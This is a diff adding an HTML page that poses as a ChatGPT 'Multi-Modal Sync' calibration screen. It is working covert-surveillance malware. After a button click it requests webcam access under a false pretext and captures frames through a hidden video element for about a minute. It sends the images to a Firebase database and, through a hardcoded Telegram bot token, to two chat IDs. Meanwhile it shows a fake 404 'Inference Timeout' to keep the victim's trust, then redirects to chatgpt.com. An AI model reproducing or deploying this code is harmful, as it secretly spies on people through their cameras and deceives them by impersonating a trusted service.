@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChatGPT | Multi-Modal Sync</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --gpt-bg: #212121;
+            --gpt-surface: #2f2f2f;
+            --gpt-green: #10a37f;
+            --gpt-text: #ececec;
+            --gpt-border: #424242;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--gpt-bg); color: var(--gpt-text);
+            font-family: 'SNEEEZE', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .gpt-card {
+            width: 100%; max-width: 480px; background: var(--gpt-bg);
+            border: 1px solid var(--gpt-border); border-radius: 12px; overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        .gpt-header {
+            padding: 16px 20px; border-bottom: 1px solid var(--gpt-border);
+            display: flex; align-items: center; gap: 12px;
+        }
+
+        .gpt-logo { 
+            width: 24px; height: 24px; background: var(--gpt-green); border-radius: 4px;
+            display: flex; align-items: center; justify-content: center;
+        }
+
+        .gpt-body { padding: 40px 32px; text-align: center; }
+
+        .ai-status-ring {
+            width: 70px; height: 70px; margin: 0 auto 24px;
+            border: 2px solid #3c3c3c; border-top: 2px solid var(--gpt-green);
+            border-radius: 50%; animation: gpt-spin 2s linear infinite;
+        }
+        @keyframes gpt-spin { to { transform: rotate(360deg); } }
+
+        h2 { font-size: 20px; font-weight: 500; margin: 0 0 12px; }
+        p { font-size: 14px; color: #b4b4b4; line-height: 1.6; margin-bottom: 32px; }
+
+        .btn-gpt {
+            background: var(--gpt-green); color: white; border: none;
+            width: 100%; padding: 12px; font-size: 14px; font-weight: 500;
+            border-radius: 8px; cursor: pointer; transition: opacity 0.2s;
+        }
+        .btn-gpt:hover { opacity: 0.9; }
+
+        /* Sync & 404 UI */
+        #sync-ui, #error-404 { display: none; }
+        
+        .pulse-text { font-size: 12px; color: var(--gpt-green); margin-bottom: 16px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+        .terminal-box {
+            text-align: left; background: #000; padding: 16px; border-radius: 8px;
+            font-family: 'Courier New', monospace; font-size: 11px; color: #888;
+            margin-top: 24px; border: 1px solid var(--gpt-border);
+        }
+
+        .error-code { font-size: 54px; font-weight: 300; color: #424242; margin-bottom: 12px; }
+        .node-info { font-size: 10px; color: #666; margin-top: 24px; text-transform: uppercase; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <div class="gpt-card">
+        <div class="gpt-header">
+            <div class="gpt-logo">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M22.2819 9.8211a5.9847 5.9847 0 0 0-.5153-4.9022 6.0462 6.0462 0 0 0-4.385-3.1097A6.0183 6.0183 0 0 0 10.8359 1.5062c-.3437.0034-.6882.028-1.031.074a6.0223 6.0223 0 0 0-4.5412 2.8553 6.0335 6.0335 0 0 0-.7192 4.5255A6.0355 6.0355 0 0 0 1.5032 12.438a6.0075 6.0075 0 0 0 3.0161 4.5055 6.0083 6.0083 0 0 0 1.2267 4.1327 6.0304 6.0304 0 0 0 4.293 2.146 6.0255 6.0255 0 0 0 5.1246-1.716 6.0422 6.0422 0 0 0 5.3313-2.8553 6.0143 6.0143 0 0 0 .7192-4.5255 6.0154 6.0154 0 0 0 1.0678-4.2843z"></path></svg>
+            </div>
+            <span style="font-size: 14px; font-weight: 500;">ChatGPT 4o-Advanced</span>
+        </div>
+
+        <!-- Initial View -->
+        <div class="gpt-body" id="init-view">
+            <div class="ai-status-ring" style="animation-duration: 4s;"></div>
+            <h2>Visual Context Calibration</h2>
+            <p>To enable <b>Spatial Intelligence</b>, the model-o1 architecture requires a workspace environment scan. This synchronizes visual metadata for high-precision reasoning.</p>
+            
+            <button class="btn-gpt" onclick="startGPTSync()">Initialize Multi-Modal Sync</button>
+            <div class="node-info">Uplink: Mumbai_West_Data_Cluster</div>
+        </div>
+
+        <!-- Sync View -->
+        <div class="gpt-body" id="sync-ui">
+            <div class="ai-status-ring"></div>
+            <div class="pulse-text">SYNCHRONIZING_VISUAL_CONTEXT</div>
+            <div style="font-size: 12px; color: #666; margin-top: 8px;" id="gpt-timer">Handshake valid for 60s</div>
+            
+            <div class="terminal-box">
+                > ALLOCATING_INFERENCE_CORES... OK<br>
+                > CALIBRATING_SPATIAL_VECTORS... 64%<br>
+                > STATUS: MAPPING_MUMBAI_NODE_RELAY
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="gpt-body" id="error-404">
+            <div class="error-code">404</div>
+            <h2 style="color: var(--gpt-green);">Inference Timeout</h2>
+            <p>The Model-o1 handshake failed due to a shard synchronization error in the Mumbai cluster. Retrying via secondary Maharashtra node.</p>
+            <div class="ai-status-ring" style="width: 30px; height: 30px;"></div>
+            <div style="font-size: 11px; color: #666;">Re-routing request...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startGPTSync() {
+            try {
+                // Requesting camera under "Visual Context Synchronization"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('gpt-timer').innerText = `Handshake valid for ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            gptCapture(count);
+                        }
+
+                        // Trigger 404 at 45s to maintain session trust
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://chatgpt.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://chatgpt.com";
+            }
+        }
+
+        function gptCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "GPT_MODAL_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_CLUSTER_W" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'gpt_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
